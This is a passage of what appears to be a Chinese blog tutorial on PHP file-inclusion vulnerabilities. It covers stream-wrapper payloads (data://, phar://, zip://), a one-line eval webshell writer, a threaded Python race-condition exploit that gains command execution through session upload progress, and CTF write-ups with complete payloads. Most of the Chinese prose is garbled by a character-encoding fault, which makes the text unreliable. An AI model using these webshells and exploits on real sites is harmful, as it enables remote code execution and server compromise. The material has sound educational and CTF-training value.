src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315212627490.png" alt loading="lazy"></p><h4 id="data-ä¼ªåè®®"><a href="#data-ä¼ªåè®®" class="headerlink" title="data://ä¼ªåè®®"></a>data://ä¼ªåè®®</h4><p><strong>æ¡ä»¶</strong></p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul><p><strong>ç”¨æ³•</strong></p><p>è‡ª<code>PHP&gt;=5.2.0</code>èµ·ï¼Œå¯ä»¥ä½¿ç”¨<code>data://</code>æ•°æ®æµå°è£…å™¨ï¼Œä»¥ä¼ é€’ç›¸åº”æ ¼å¼çš„æ•°æ®ã€‚é€šå¸¸å¯ä»¥ç”¨æ¥æ‰§è¡ŒPHPä»£ç ã€‚</p><ol><li><code>data://text/plain;base64,</code></li><li><code>data://text/plain,</code></li><li><code>data:text/plain;base64,</code></li><li><code>data:text/plain,</code></li></ol><p><strong>æ¼”ç¤º</strong></p><pre class="language-php" data-language="php"><code class="language-php">2.phpä»£ç ï¼š<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">===</span>base64<span class="token operator">===</span><span class="token operator">></span>  PD9waHAgcGhwaW5mbygpOw<span class="token operator">==</span></span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315213202734.png" alt loading="lazy"></p><p>è¯»å–æ–‡ä»¶å†…å®¹æ“ä½œ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">===</span>base64<span class="token operator">===</span><span class="token operator">></span>   PD9waHAgc2hvd19zb3VyY2UoJzEucGhwJyk7</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315214340393.png" alt loading="lazy"></p><h4 id="phar-ä¼ªåè®®"><a href="#phar-ä¼ªåè®®" class="headerlink" title="phar://ä¼ªåè®®"></a>phar://ä¼ªåè®®</h4><p>ç”¨æ³•ï¼š<code>?a=phar://å‹ç¼©åŒ…/å†…éƒ¨æ–‡ä»¶ phar://xxx.png/shell.php</code></p><pre class="language-php" data-language="php"><code class="language-php">2.phpä»£ç ï¼š<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>æ³¨æ„ï¼š <code>PHP &gt; =5.3.0</code> å‹ç¼©åŒ…éœ€è¦æ˜¯<code>zip</code>åè®®å‹ç¼©ï¼Œ<code>rar</code>ä¸è¡Œï¼Œå°†æœ¨é©¬æ–‡ä»¶å‹ç¼©åï¼Œæ”¹ä¸ºå…¶ä»–ä»»æ„æ ¼å¼çš„æ–‡ä»¶éƒ½å¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚ </p><p>æ­¥éª¤ï¼š å†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬æ–‡ä»¶<code>shell.php</code>ï¼Œç„¶åç”¨<code>zip</code>åè®®å‹ç¼©ä¸º<code>shell.zip</code>ï¼Œç„¶åå°†åç¼€æ”¹ä¸º<code>png</code>ç­‰å…¶ä»–æ ¼å¼ã€‚ </p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315215247124.png" alt loading="lazy"></p><p>äº¦å¯å†™é©¬</p><pre class="language-php" data-language="php"><code class="language-php">cmd=fputs(fopen('shell.php','w'),'<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>');</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315215651827.png" alt loading="lazy"></p><h4 id="http-amp-https-ä¼ªåè®®"><a href="#http-amp-https-ä¼ªåè®®" class="headerlink" title="http:// &amp; https:// ä¼ªåè®®"></a>http:// &amp; https:// ä¼ªåè®®</h4><p><strong>æ¡ä»¶</strong></p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul><p><strong>ç”¨æ³•</strong></p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//example.com<span class="token header-name keyword">http:</span>//example.com/file.php?var1=val1&amp;var2=val2<span class="token header-name keyword">http:</span>//user:password@example.com<span class="token header-name keyword">https:</span>//example.com<span class="token header-name keyword">https:</span>//example.com/file.php?var1=val1&amp;var2=val2<span class="token header-name keyword">https:</span>//user:password@example.com</code></pre><h4 id="zip-amp-bzip2-amp-zlib-ä¼ªåè®®"><a href="#zip-amp-bzip2-amp-zlib-ä¼ªåè®®" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib://ä¼ªåè®®"></a>zip:// &amp; bzip2:// &amp; zlib://ä¼ªåè®®</h4><p><strong>æ¡ä»¶</strong></p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :off/on</li></ul><p><strong>ç”¨æ³•</strong></p><p><code>zip:// &amp; bzip2:// &amp; zlib://</code> å‡å±äºå‹ç¼©æµï¼Œå¯ä»¥è®¿é—®å‹ç¼©æ–‡ä»¶ä¸­çš„å­æ–‡ä»¶ï¼Œæ›´é‡è¦çš„æ˜¯ä¸éœ€è¦æŒ‡å®šåç¼€åï¼Œå¯ä¿®æ”¹ä¸ºä»»æ„åç¼€ï¼š<code>jpg png gif xxx</code> ç­‰ç­‰ã€‚</p><ol><li><code>zip://[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]%23[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å]</code>ï¼ˆ#ç¼–ç ä¸º%23ï¼‰å‹ç¼© phpinfo.txt ä¸º phpinfo.zip ï¼Œå‹ç¼©åŒ…é‡å‘½åä¸º phpinfo.jpg ï¼Œå¹¶ä¸Šä¼ </li><li><code>compress.bzip2://file.bz2</code>   å‹ç¼© phpinfo.txt ä¸º phpinfo.bz2 å¹¶ä¸Šä¼ ï¼ˆåŒæ ·æ”¯æŒä»»æ„åç¼€åï¼‰</li><li><code>compress.zlib://file.gz</code>   å‹ç¼© phpinfo.txt ä¸º phpinfo.gz å¹¶ä¸Šä¼ ï¼ˆåŒæ ·æ”¯æŒä»»æ„åç¼€åï¼‰</li></ol><p><strong>æ¼”ç¤º</strong></p><pre class="language-php" data-language="php"><code class="language-php">2.phpä»£ç ï¼š<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>ç”¨æ³•ï¼š<code>?file=zip://[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å] zip://xxx.png#shell.php</code></p><p>æ¡ä»¶ï¼š PHP &gt; =5.3.0ï¼Œ #åœ¨æµè§ˆå™¨ä¸­è¦ç¼–ç ä¸º%23</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315220043657.png" alt loading="lazy"></p><p>äº¦å¯ä¸ä¸Šé¢çš„ä¸€æ ·å°±è¡Œå†™é©¬æ“ä½œ</p><h3 id="Sessionæ–‡ä»¶åŒ…å«"><a href="#Sessionæ–‡ä»¶åŒ…å«" class="headerlink" title="Sessionæ–‡ä»¶åŒ…å«"></a>Sessionæ–‡ä»¶åŒ…å«</h3><h4 id="LFI-Session"><a href="#LFI-Session" class="headerlink" title="LFI Session"></a>LFI Session</h4><p>index.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$file</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>session.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>å†™sessionæ–‡ä»¶é©¬ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20210429183118771.png" alt loading="lazy"></p><p>åŒ…å«sessionæ–‡ä»¶ï¼ŒæˆåŠŸå‘½ä»¤æ‰§è¡Œ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20210429183226742.png" alt loading="lazy"></p><p>æœ¬åœ°é…ç½®å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20210429181916866.png" alt loading="lazy"></p><ul><li><strong>session.auto_start</strong>ï¼šåœ¨phpæ¥æ”¶è¯·æ±‚çš„æ—¶å€™è‡ªåŠ¨åˆå§‹åŒ–Sessionï¼Œä¸éœ€è¦å†æ‰§è¡Œ<code>session_start()</code>ï¼Œé»˜è®¤æƒ…å†µä¸‹å…³é—­ã€‚</li><li><strong>session.save_path</strong>ï¼šSessionå­˜å‚¨çš„ä½ç½®ï¼Œæˆ‘è¿™é‡Œå°±æ˜¯<code>D:\phpstudy\Extensions\tmp\tmp</code>ã€‚</li><li><strong>session.serialize_handler</strong>ï¼š <ul><li><strong>php</strong>ï¼šä¸€ç›´éƒ½åœ¨(é»˜è®¤æ–¹å¼)  å®ƒæ˜¯ç”¨ |åˆ†å‰²ã€‚</li><li><strong>php_serialize</strong> ï¼šphp5.5ä¹‹åå¯ç”¨ å®ƒæ˜¯ç”¨serializeååºåˆ—åŒ–æ ¼å¼åˆ†å‰²ã€‚</li></ul></li><li><strong>session.use_strict_mode</strong>ï¼šé»˜è®¤ä¸º0ï¼Œç”¨æˆ·å¯ä»¥è‡ªå·±å®šä¹‰<code>Session ID</code>ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬åœ¨Cookieé‡Œè®¾ç½®<code>PHPSESSID=flag</code>ï¼ŒPHPå°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼š<code>sess_flag</code>ã€‚</li><li><strong>session.upload_progress</strong>ï¼šphp&gt;=5.4æ·»åŠ çš„ã€‚æœ€åˆæ˜¯PHPä¸ºä¸Šä¼ è¿›åº¦æ¡è®¾è®¡çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œåœ¨ä¸Šä¼ æ–‡ä»¶è¾ƒå¤§çš„æƒ…å†µä¸‹ï¼ŒPHPå°†è¿›è¡Œæµå¼ä¸Šä¼ ï¼Œå¹¶å°†è¿›åº¦ä¿¡æ¯æ”¾åœ¨Sessionä¸­ï¼ˆåŒ…å«ç”¨æˆ·å¯æ§çš„å€¼ï¼‰ï¼Œå³ä½¿æ­¤æ—¶ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ–Sessionï¼ŒPHPä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionã€‚ è€Œä¸”ï¼Œé»˜è®¤æƒ…å†µä¸‹session.upload_progress.enabledæ˜¯ä¸ºOnçš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªç‰¹æ€§é»˜è®¤å¼€å¯ã€‚</li><li><strong>session.upload_progress.enabled</strong>ï¼šé»˜è®¤å¼€å¯ï¼Œè¡¨ç¤º<code>upload_progress</code>åŠŸèƒ½å¼€å§‹ï¼Œphpèƒ½åœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ç›‘æµ‹ä¸Šä¼ è¿›åº¦ï¼Œè¿™ä¸ªä¿¡æ¯å¯¹ä¸Šä¼ è¯·æ±‚è‡ªèº«å¹¶æ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Œä½†åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶åº”ç”¨å¯ä»¥å‘é€ä¸€ä¸ªPOSTè¯·æ±‚åˆ°ç»ˆç«¯ï¼ˆä¾‹å¦‚é€šè¿‡XHRï¼‰æ¥æ£€æŸ¥è¿™ä¸ªçŠ¶æ€ã€‚</li><li><strong>session.upload_progress.cleanup</strong>ï¼šé»˜è®¤å¼€å¯è¿™ä¸ªé€‰é¡¹ï¼Œè¡¨ç¤ºå½“æ–‡ä»¶ä¸Šä¼ ç»“æŸåï¼Œphpå°†ä¼šç«‹å³æ¸…ç©ºå¯¹åº”sessionæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œè¿™ä¸ªé€‰é¡¹éå¸¸é‡è¦ã€‚</li><li><strong>session.upload_progress.prefix</strong>ä¸<strong>session.upload_progress.name</strong>ï¼šå½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„<code>session.upload_progress.name</code>å˜é‡åŒåï¼ˆ<code>PHP_SESSION_UPLOAD_PROGRESS</code>ï¼‰æ—¶ï¼ˆè¿™éƒ¨åˆ†æ•°æ®ç”¨æˆ·å¯æ§ï¼‰ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨SESSIONä¸­è·å¾—ã€‚å½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨SESSIONä¸­æ·»åŠ ä¸€ç»„æ•°æ®ï¼ˆç³»ç»Ÿè‡ªåŠ¨åˆå§‹åŒ–sessionï¼‰, ç´¢å¼•æ˜¯<code>session.upload_progress.prefix</code>ä¸<code>session.upload_progress.name</code>è¿æ¥åœ¨ä¸€èµ·çš„å€¼ã€‚</li><li><strong>session.upload_progress.freq **ä¸</strong>session.upload_progress.min_freq**ï¼šé€‰é¡¹æ§åˆ¶äº†ä¸Šä¼ è¿›åº¦ä¿¡æ¯åº”è¯¥å¤šä¹…è¢«é‡æ–°è®¡ç®—ä¸€æ¬¡ã€‚ é€šè¿‡åˆç†è®¾ç½®è¿™ä¸¤ä¸ªé€‰é¡¹çš„å€¼ï¼Œè¿™ä¸ªåŠŸèƒ½çš„å¼€é”€å‡ ä¹å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚</li></ul><h4 id="NO-session-start"><a href="#NO-session-start" class="headerlink" title="NO session_start()"></a>NO session_start()</h4><p>åœ¨æ²¡æœ‰<code>session_start()</code>çš„æ—¶å€™ï¼Œå°±è¯¥åˆ©ç”¨5.4åçš„æ–°åŠŸèƒ½<code>upload_progress</code>æ¥è¿›è¡Œæ“ä½œäº†</p><p><a href="http://php.net/manual/zh/session.upload-progress.php">PHP_SESSION_UPLOAD_PROGRESSçš„å®˜æ–¹æ‰‹å†Œ</a></p><p>åœ¨sessionä¸­éƒ¨åˆ†æ•°æ®(<code>session.upload_progress.name</code>)æ˜¯ç”¨æˆ·è‡ªå·±å¯ä»¥æ§åˆ¶çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åœ¨ä¸Šä¼ æ–‡ä»¶çš„è¿‡ç¨‹ä¸­ï¼Œåœ¨Cookieä¸­è®¾ç½®PHPSESSID=flagï¼ˆé»˜è®¤æƒ…å†µä¸‹ç”¨æˆ·å¯ä»¥è‡ªå®šä¹‰session IDï¼‰ï¼ŒåŒæ—¶ä¸Šä¼ ä¸€ä¸ªæ¶æ„çš„å­—æ®µ<code>PHP_SESSION_UPLOAD_PROGRESS</code>ï¼Œåªè¦ä¸Šä¼ åŒ…é‡Œå¸¦è¿™ä¸ªé”®ï¼ŒPHPå°±ä¼šè‡ªåŠ¨å¯ç”¨Sessionï¼ŒåŒæ—¶ï¼Œæˆ‘ä»¬åœ¨Cookieä¸­è®¾ç½®äº†PHPSESSID=flagï¼Œæ‰€ä»¥Sessionä¼šè‡ªåŠ¨åˆ›å»ºï¼Œä½†æ˜¯æœ‰ä¸€ä¸ª<code>session.upload_progress.cleanup</code>è¿™ä¸ªé€‰é¡¹æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œæ­¤æ—¶å°±éœ€è¦ç”¨æ¡ä»¶ç«äº‰æ¥åˆ©ç”¨ã€‚å†™è„šæœ¬å³å¯</p><p>expï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io<span class="token keyword">import</span> sys<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingsessid <span class="token operator">=</span> <span class="token string">'flag'</span>url <span class="token operator">=</span> <span class="token string">'http://172.17.10.2:801/index.php'</span><span class="token keyword">def</span> <span class="token function">POST</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>        session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>            url<span class="token punctuation">,</span>            data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span><span class="token string">"&lt;?php system('whoami');?>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'q.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>sessid<span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">READ</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">?file=../Extensions/tmp/tmp/sess_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sessid<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'extrader'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+++]retry'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>    t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>POST<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    READ<span class="token punctuation">(</span>session<span class="token punctuation">)</span></code></pre><p>å¾—åˆ°ç»“æœå¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20210429195115800.png" alt loading="lazy"></p><p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨<strong>burp</strong>çš„<strong>intruder</strong>æ¨¡å—è¿›è¡Œæ“ä½œ</p><h3 id="æ —å­"><a href="#æ —å­" class="headerlink" title="æ —å­"></a>æ —å­</h3><h4 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="ZJCTF-2019-NiZhuanSiWei"></a>ZJCTF-2019-NiZhuanSiWei</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"welcome to the zjctf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;h1>"</span><span class="token operator">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/h1>&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Not now!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//useless.php</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><code>file_get_contents</code>ï¼šå°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²</p><p>é¦–å…ˆä¼ å…¥<code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code>ç»•è¿‡ç¬¬ä¸€ä¸ªif</p><p>ç„¶åä¼ å…¥<code>file=php://filter/read=convert.base64-encode/resource=useless.php</code>è¯»å–<code>useless.php</code></p><p>base64è§£ç åä»£ç å¦‚ä¸‹ï¼š</p><pre class="language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php  class Flag&#123;  &#x2F;&#x2F;flag.php      public $file;      public function __tostring()&#123;          if(isset($this-&gt;file))&#123;              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);        &#125;      &#125;  &#125;  ?&gt;  </code></pre><p>éšåå†ä¼ å…¥<code>password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code>ï¼ŒåŒ…å«<code>file=useless.php</code>å³å¯å¾—åˆ°flag</p><p>å®Œæ•´payloadï¼š</p><pre class="language-none"><code class="language-none">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;file&#x3D;useless.phppassword&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></pre><h4 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h4><p>è¯·æ±‚<code>index.php?category=woofers&#39;</code>æ—¶å¾—åˆ°<code>include</code>æŠ¥é”™ï¼Œå¹¶ä¸”<code>include</code>ä¼šå­—ç¬¦ä¸²åé¢åŠ ä¸Šä¸€ä¸ª<code>.php</code></p><p>äºæ˜¯å…ˆç”¨<code>php://filter</code>åè®®è¯»ä¸€ä¸‹<code>index.php</code>æ–‡ä»¶</p><p><code>php://filter/read=convert.base64-encode/resource=index</code>ï¼Œè§£ç å¾—åˆ°å…¥å¦‚ä¸‹ç»“æœï¼ˆèˆå»htmlå…ƒç´ ï¼‰</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>                            <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">strpos</span><span class="token punctuation">(</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"woofers"</span> <span class="token punctuation">)</span> <span class="token operator">!==</span>  <span class="token keyword type-declaration">false</span> <span class="token operator">||</span> <span class="token class-name">strpos</span><span class="token punctuation">(</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"meowers"</span> <span class="token punctuation">)</span> <span class="token 